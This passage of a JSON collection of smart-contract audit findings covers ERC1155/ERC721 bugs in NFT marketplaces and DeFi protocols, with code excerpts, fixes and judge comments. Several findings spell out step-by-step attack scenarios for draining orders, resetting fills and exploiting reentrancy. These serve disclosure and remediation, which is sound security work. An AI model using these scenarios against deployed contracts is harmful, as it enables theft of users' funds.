ERC721 interface. Then,\n\n```solidity\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n```\n\nSince the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item ([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.\n\nThat means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.\n\nNote that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.\n\n### Proof of Concept\n\nCheck the return values of [Sandbox's ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.\n\n### Recommended Mitigation Steps\n\nReorder the checks,e.g.,\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    }\n  }\n```\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1162965894):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760.\n\n**[HardlyDifficult commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1179595297):**\n > When an NFT supports both 721 & 1155 interfaces, the code prefers `_transferERC721s` - however this ignores the order's `numTokens`. This may result in under filling NFTs for an order, at the same cost to the buyer. The warden's recommendation would address this concern. Or maybe `_transferERC721s` could require `numTokens == 1`, but that approach would be limiting for this scenario. Since the buyer gets a fraction of what they paid for and it impacts a top20 1155, this seems to be a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange smart contract, which could lead to users paying for more tokens than they receive. The bug affects tokens that support both ERC721 and ERC1155 standards, such as the asset token of The Sandbox Game. The vulnerability is caused by the code in the InfinityExchange contract, which first checks ERC721 interface supports and then ERC1155, leading to only one item being transferred instead of the expected two. The bug can be fixed by reordering the checks, so the ERC1155 check is first. This would ensure that the expected number of tokens is transferred.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-06-infinity-nft-marketplace-contest",
      "sponsor_name": "Infinity NFT Marketplace",
      "sponsor_link": "https://twitter.com/infinitydotxyz",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/43",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "136",
      "slug": "h-06-some-real-world-nft-tokens-may-support-both-erc721-and-erc1155-standards-which-may-break-infinityexchange_transfernfts-code4rena-infinity-nft-marketplace-infinity-nft-marketplace-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Infinity NFT Marketplace",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Infinity NFT Marketplace",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Gaming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "supportsInterface"
          }
        }
      ]
    },
    {
      "id": "2768",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "208",
      "title": "[H-02] Loss of funds in `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` because code don't check that different ids in one collection are different, so it's possible to sell one id multiple time instead of selling multiple id one time in one collection of order (lack of checks in `doTokenIdsIntersect()` especially for ERC1155 tokens)",
      "content": "_Submitted by unforgiven_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243>\n\n### Impact\n\nFunction `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` suppose to match `sell order` to `buy order` and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an `order` has different `NFT token ids` in each one of it's collections, so even so number of tokens could be valid in `order` to `order` transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of `ERC1155` there can be more than one token for a `tokenId`, so it would be possible to transfer it)\n\n### Proof of Concept\n\nThis is `_takeOrders()` and `and` code:\n\n      /**\n       * @notice Internal helper function to take orders\n       * @dev verifies whether order can be executed\n       * @param makerOrder the maker order\n       * @param takerItems nfts to be transferred\n       * @param execPrice execution price\n       */\n      function _takeOrders(\n        OrderTypes.MakerOrder calldata makerOrder,\n        OrderTypes.OrderItem[] calldata takerItems,\n        uint256 execPrice\n      ) internal {\n        bytes32 makerOrderHash = _hash(makerOrder);\n        bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n        bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n        require(makerOrderValid && executionValid, 'order not verified');\n        _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n      }\n\nAs you can see it uses `canExecTakeOrder()` to check that it is valid to perform matching. This is `canExecTakeOrder()` and `areTakerNumItemsValid()` and `doTokenIdsIntersect()` code which are used in execution flow to check orders and matching validity:\n\n      /**\n       * @notice Checks whether take orders with a higher order intent can be executed\n       * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n              It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid\n              and whether the nfts intersect\n       * @param makerOrder the maker order\n       * @param takerItems the taker items specified by the taker\n       * @return returns whether order can be executed\n       */\n      function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        external\n        view\n        override\n        returns (bool)\n      {\n        return (makerOrder.constraints[3] <= block.timestamp &&\n          makerOrder.constraints[4] >= block.timestamp &&\n          areTakerNumItemsValid(makerOrder, takerItems) &&\n          doItemsIntersect(makerOrder.nfts, takerItems));\n      }\n\n      /// @dev sanity check to make sure that a taker is specifying the right number of items\n      function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 numTakerItems = 0;\n        uint256 nftsLength = takerItems.length;\n        for (uint256 i = 0; i < nftsLength; ) {\n          unchecked {\n            numTakerItems += takerItems[i].tokens.length;\n            ++i;\n          }\n        }\n        return makerOrder.constraints[0] == numTakerItems;\n      }\n\n      /**\n       * @notice Checks whether tokenIds intersect\n       * @dev This function checks whether there are intersecting tokenIds between two order items\n       * @param item1 first item\n       * @param item2 second item\n       * @return returns whether tokenIds intersect\n       */\n      function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 item1TokensLength = item1.tokens.length;\n        uint256 item2TokensLength = item2.tokens.length;\n        // case where maker/taker didn't specify any tokenIds for this collection\n        if (item1TokensLength == 0 || item2TokensLength == 0) {\n          return true;\n        }\n        uint256 numTokenIdsPerCollMatched = 0;\n        for (uint256 k = 0; k < item2TokensLength; ) {\n          for (uint256 l = 0; l < item1TokensLength; ) {\n            if (\n              item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n            ) {\n              // increment numTokenIdsPerCollMatched\n              unchecked {\n                ++numTokenIdsPerCollMatched;\n              }\n              // short circuit\n              break;\n            }\n            unchecked {\n              ++l;\n            }\n          }\n          unchecked {\n            ++k;\n          }\n        }\n\n        return numTokenIdsPerCollMatched == item2TokensLength;\n      }\n\nAs you can see there is no logic to check that `token IDs` in one collection of order are different and code only checks that total number of tokens in one `order` matches the number of tokens specified and the ids in one order exists in other list defined. function `doTokenIdsIntersect()` checks to see that `tokens ids` in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for `ERC1155` tokens (normal `ERC721` requires more strange conditions). here is first example:\n\n1.  For simplicity, let's assume collection and timestamp are valid and match for orders and token is `ERC1155`\n2.  `user1` has signed this order: A:`(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)` (buy `1` token of each `id=1,2,3`)\n3.  `NFT ID[1]` fair price is `1 ETH`, `NFT ID[2]` fair price is `2 ETH`, `NFT ID[3]` fair price is `12 ETH`\n4.  `attacker` who has 3 of `NFT ID[1]` create this list: B:`(NFT IDs[(1,1), (1,1), (1,1)] )` (list to trade `1`token of `id=1` for 3 times)\n5.  Attacker call `takeOrders()` with this parameters: makerOrder: A , takerNfts: B\n6.  Contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction.\n7.  `attacker` would receive `15 ETH` for his 3 token of `NFT ID[1]` and steal `user1` funds. `user1` would receive 3 of `NFT ID[1]` and pays `15 ETH` and even so his order A has been executed he doesn't receive `NFT IDs[(2,1),(3,1)]` and contract would violates his signed parameters.\n\nThis examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function `doTokenIdsIntersect()` doesn't check for this).\n\nThis scenario is performable to `matchOneToManyOrders()` and `matchOrders()` and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call `takeOrders()` if NFT tokens are `ERC1155`. for other `NFT` tokens to perform this attack it requires that `seller==buyer` or some other strange cases (like auto selling when receiving in one contract).\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nAdd checks to ensure `order`'s one `collection`'s token ids are not duplicate in `doTokenIdsIntersect()`\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1162878540):**\n > Agree with assessment. Fixed. https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8 and removed support for ERC1155\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1179823515):**\n > This is an interesting scenario where the same NFT appears multiple times in a match and results in one order being under filled, leading to potential losses for the user. And the attack does not depend on the matching engine. Agree this is High risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project called Infinity. This project is a decentralized exchange for trading Non-Fungible Tokens (NFTs). The bug is in the code of the function `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` which are used to match \"sell order\" to \"buy order\" and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. The problem is that there is no check in the code to verify that an order has different Non-Fungible Token (NFT) ids in each of its collections. This means that it is possible for a user to transfer the wrong tokens and lose funds.\n\nTo exploit this vulnerability, an attacker could create a list of tokens to trade (B) with the same NFT id but different numbers of tokens. They could then call the `takeOrders()` function with this list and the user's order (A). The code does not check that the NFT ids in the order are different, so the attacker would receive the funds from the user's order for the same NFT id but different numbers of tokens. The user would receive the wrong tokens and lose funds.\n\nThe recommended mitigation step is to add checks to the code to ensure that the order's one collection's token ids are not duplicates in the `doTokenIdsIntersect()` function. This would help to prevent attackers from exploiting the vulnerability.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-06-infinity-nft-marketplace-contest",
      "sponsor_name": "Infinity NFT Marketplace",
      "sponsor_link": "https://twitter.com/infinitydotxyz",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/135",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "136",
      "slug": "h-02-loss-of-funds-in-matchonetomanyorders-and-takeorders-and-matchorders-because-code-dont-check-that-different-ids-in-one-collection-are-different-so-its-possible-to-sell-one-id-multiple-time-instead-of-selling-multiple-id-one-time-in-one-collection-of-order-lack-of-checks-in-dotokenidsintersect-especially-for-erc1155-tokens-code4rena-infinity-nft-marketplace-infinity-nft-marketplace-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Infinity NFT Marketplace",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Infinity NFT Marketplace",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Gaming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "2621",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 9,
      "protocol_id": "59",
      "title": "[H-01] Truncation in `OrderValidator` can lead to resetting the fill and selling more tokens",
      "content": "\n[OrderValidator.sol#L228](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L228)<br>\n[OrderValidator.sol#L231](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L231)<br>\n[OrderValidator.sol#L237](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L237)<br>\n[OrderValidator.sol#L238](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L238)<br>\n\nA partial order's fractions (`numerator` and `denominator`) can be reset to `0` due to a truncation. This can be used to craft malicious orders:\n\n1.  Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the `marketplaceContract`.\n2.  Alice places a `PARTIAL_OPEN` order with 10 ERC1155 tokens and consideration of ETH.\n3.  Malory tries to fill the order in the following way:\n    1.  Malory tries to fill 50% of the order, but instead of providing the fraction `1 / 2`, Bob provides `2**118 / 2**119`. This sets the `totalFilled` to `2**118` and `totalSize` to `2**119`.\n    2.  Malory tries to fill 10% of the order, by providing `1 / 10`. The computation `2**118 / 2**119 + 1 / 10` is done by \"cross multiplying\" the denominators, leading to the acutal fraction being `numerator = (2**118 * 10 + 2**119)` and `denominator = 2**119 * 10`.\n    3.  Because of the `uint120` truncation in [OrderValidator.sol#L228-L248](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/OrderValidator.sol#L228-L248), the `numerator` and `denominator` are truncated to `0` and `0` respectively.\n    4.  Bob can now continue filling the order and draining any approved (1000 tokens in total) of the above ERC1155 tokens, for the same consideration amount!\n\n### Proof of Concept\n\nView [full POC](https://gist.github.com/hrkrshnn/7c51b23f7c43c55ba0f8157c3b298409).\n\nThe following change would make the above POC fail:\n\n```diff\nmodified   contracts/lib/OrderValidator.sol\n@@ -225,6 +225,8 @@ contract OrderValidator is Executor, ZoneInteraction {\n                 // Update order status and fill amount, packing struct values.\n                 _orderStatus[orderHash].isValidated = true;\n                 _orderStatus[orderHash].isCancelled = false;\n+                require(filledNumerator + numerator <= type(uint120).max, \"overflow\");\n+                require(denominator <= type(uint120).max, \"overflow\");\n                 _orderStatus[orderHash].numerator = uint120(\n                     filledNumerator + numerator\n                 );\n@@ -234,6 +236,8 @@ contract OrderValidator is Executor, ZoneInteraction {\n             // Update order status and fill amount, packing struct values.\n             _orderStatus[orderHash].isValidated = true;\n             _orderStatus[orderHash].isCancelled = false;\n+            require(numerator <= type(uint120).max, \"overflow\");\n+            require(denominator <= type(uint120).max, \"overflow\");\n             _orderStatus[orderHash].numerator = uint120(numerator);\n             _orderStatus[orderHash].denominator = uint120(denominator);\n         }\n```\n\n### Recommended Mitigation Steps\n\nA basic fix for this would involve adding the above checks for overflow / truncation and reverting in that case. However, we think the mechanism is still flawed in some respects and requires more changes to fully fix it. See a related issue: [\"A malicious filler can fill a partial order in such a way that the rest cannot be filled by anyone\"](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/101) that points out a related but a more fundamental issue with the mechanism.\n\n**[0age (OpenSea) confirmed](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77#issuecomment-1162425341):**\n > I've identified that this issue and all of its duplicates clearly outline how an attacker might overflow an order to continually fulfill an order at the same market price.\n> \n> An instance where this issue might cause issues is during a restricted token sale. A relevant scenario is detailed as follows:\n>  - A new token is created and the owner wishes to sell 50% of the token supply to the public.\n>  - Because of an edge case in `OrderValidator`, the order fulfillment can be reset to allow the public to more than 50% of the total token supply.\n>  - As a result, allocations intended to be distributed to investors and the team, will no longer be available.\n>  - It is important to note, that additional tokens will be sold at the intended market price listed by the original order.\n> \n> For these reasons, I believe this issue to be of high severity because it breaks certain trust assumptions made by the protocol and its userbase. By intentionally forcing a user to sell additional tokens, you are effectively altering the allocation of their wallet holdings, potentially leading to further funds loss as they may incur slippage when they have to sell these tokens back.\n> \n> A great finding from all involved!\n\n**[0age (OpenSea) resolved](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77):**\n > PR: [ProjectOpenSea/seaport#319](https://github.com/ProjectOpenSea/seaport/pull/319)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the OrderValidator.sol file of the code-423n4/2022-05-opensea-seaport repository on GitHub. The vulnerability can be used to craft malicious orders. The malicious order is crafted by Malory, who tries to fill 50% of the order, but instead of providing the fraction 1/2, Malory provides 2**118/2**119. This sets the totalFilled to 2**118 and totalSize to 2**119. Malory then tries to fill 10% of the order, by providing 1/10. The computation 2**118/2**119 + 1/10 is done by \"cross multiplying\" the denominators, leading to the actual fraction being numerator = (2**118*10 + 2**119) and denominator = 2**119*10. Because of the uint120 truncation in OrderValidator.sol#L228-L248, the numerator and denominator are truncated to 0 and 0 respectively. This allows Malory to continue filling the order and draining any approved (1000 tokens in total) of the ERC1155 tokens, for the same consideration amount. A proof of concept can be found in the provided link. A basic fix for this would involve adding checks for overflow/truncation and reverting in that case. However, more changes may be required to fully fix the issue.",
      "report_date": {},
      "contest_prize_txt": "$1,000,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-05-opensea-seaport-contest",
      "sponsor_name": "OpenSea",
      "sponsor_link": "https://twitter.com/opensea",
      "quality_score": 2.3333333333333335,
      "general_score": 1,
      "source_link": "https://code4rena.com/reports/2022-05-opensea-seaport",
      "github_link": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "128",
      "slug": "h-01-truncation-in-ordervalidator-can-lead-to-resetting-the-fill-and-selling-more-tokens-code4rena-opensea-opensea-seaport-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "OpenSea",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "OpenSea",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        },
        {
          "tags_tag": {
            "title": "Overflow/Underflow"
          }
        }
      ]
    },
    {
      "id": "1063",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "345",
      "title": "[H-02] OZ ERC1155Supply vulnerability",
      "content": "_Submitted by pauliax, also found by hubble and defsec_\n\n#### Impact\n\nOverlay uses OZ contracts version 4.3.2:\n\n```yaml\n  dependencies:\n    - OpenZeppelin/openzeppelin-contracts@4.3.2\n```\n\nand has a contract that inherits from ERC1155Supply:\n\n```solidity\n  contract OverlayV1OVLCollateral is ERC1155Supply\n```\n\nThis version has a recently discovered vulnerability:\n<https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-wmpv-c2jp-j2xg>\n\nIn your case, function unwind relies on totalSupply when calculating `\\_userNotional`, `\\_userDebt`, `\\_userCost`, and `\\_userOi`, so a malicious actor can exploit this vulnerability by first calling 'build' and then on callback 'unwind' in the same transaction before the total supply is updated.\n\n#### Recommended Mitigation Steps\n\nConsider updating to a patched version of 4.3.3.\n\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/127)**\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the Overlay contracts version 4.3.2, which is used in the application. The vulnerability is related to the ERC1155Supply contract, and it can be exploited by a malicious actor by first calling the 'build' and then 'unwind' functions in the same transaction before the total supply is updated. The recommended mitigation step is to update to a patched version of 4.3.3.",
      "report_date": {},
      "contest_prize_txt": "$50,000 worth of ETH",
      "contest_link": "https://code4rena.com/contests/2021-11-overlay-protocol-contest",
      "sponsor_name": "Overlay Protocol",
      "sponsor_link": "https://twitter.com/overlayprotocol",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/127",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "49",
      "slug": "h-02-oz-erc1155supply-vulnerability-code4rena-overlay-protocol-overlay-protocol-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Overlay Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Overlay Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Oracle"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "4009",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 0,
      "protocol_id": "324",
      "title": "[H-03] getRandomTokenIdFromFund yields wrong probabilities for ERC1155",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`NFTXVaultUpgradeable.getRandomTokenIdFromFund` does not work with ERC1155 as it does not take the deposited `quantity1155` into account. \n\n## Impact\n\nAssume `tokenId0` has a count of 100, and `tokenId1` has a count of 1.\nThen `getRandomId` would have a pseudo-random 1:1 chance for token 0 and 1 when in reality it should be 100:1.\n\nThis might make it easier for an attacker to redeem more valuable NFTs as the probabilities are off.\n\n## Recommended Mitigation Steps\n\nTake the quantities of each token into account (`quantity1155`) which probably requires a design change as it's currently hard to do without iterating over all tokens.",
      "summary": "\nA bug has been reported in the NFTXVaultUpgradeable.getRandomTokenIdFromFund function which does not take the deposited quantity1155 into account. This could lead to an attacker being able to redeem more valuable NFTs as the probabilities are off. The recommended mitigation step is to take the quantities of each token into account, which might require a design change as it is currently hard to do without iterating over all tokens.",
      "report_date": {},
      "contest_prize_txt": "$66,000 USDC",
      "contest_link": "https://code4rena.com/contests/2021-05-nftx-contest",
      "sponsor_name": "NFTX",
      "sponsor_link": "https://nftx.org/",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/56",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "8",
      "slug": "h-03-getrandomtokenidfromfund-yields-wrong-probabilities-for-erc1155-code4rena-nftx-nftx-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "NFTX",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "NFTX",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "13488",
      "kind": "MARKDOWN",
      "auditfirm_id": "8",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "460",
      "title": "Re-entrancy issue for ERC1155 Fixed",
      "content": "#### Resolution\n\n\n\nAddressed by moving `isNFTDistributed = true;` before the token transfers and only transferring tokens to the message sender.\n\n\n#### Description\n\n\nERC1155 tokens have callback functions on some of the transfers, like `safeTransferFrom`, `safeBatchTransferFrom`. During these transfers, the `IERC1155ReceiverUpgradeable(to).onERC1155Received` function is called in the `to` address.\n\n\nFor example, `safeTransferFrom` is used in the `LiquidityMining` contract:\n\n\n**code/contracts/LiquidityMining.sol:L204-L224**\n\n\n\n```\nfunction distributeAllNFT() external {\n    require(block.timestamp > getEndLMTime(),\n        \"2 weeks after liquidity mining time has not expired\");\n    require(!isNFTDistributed, \"NFT is already distributed\");\n\n    for (uint256 i = 0; i < leaderboard.length; i++) {\n        address[] memory \\_groupLeaders = groupsLeaders[leaderboard[i]];\n\n        for (uint256 j = 0; j < \\_groupLeaders.length; j++) {\n            \\_sendNFT(j, \\_groupLeaders[j]);\n        }\n    }\n\n    for (uint256 i = 0; i < topUsers.length; i++) {\n        address \\_currentAddress = topUsers[i];\n        LMNFT.safeTransferFrom(address(this), \\_currentAddress, 1, 1, \"\");\n        emit NFTSent(\\_currentAddress, 1);\n    }\n\n    isNFTDistributed = true;\n}\n\n```\nDuring that transfer, the `distributeAllNFT`  function can be called again and again. So multiple transfers will be done for each user.\n\n\nIn addition to that, any receiver of the tokens can revert the transfer. If that happens, nobody will be able to receive their tokens.\n\n\n#### Recommendation\n\n\n* Add a reentrancy guard.\n* Avoid transferring tokens for different receivers in a single transaction.",
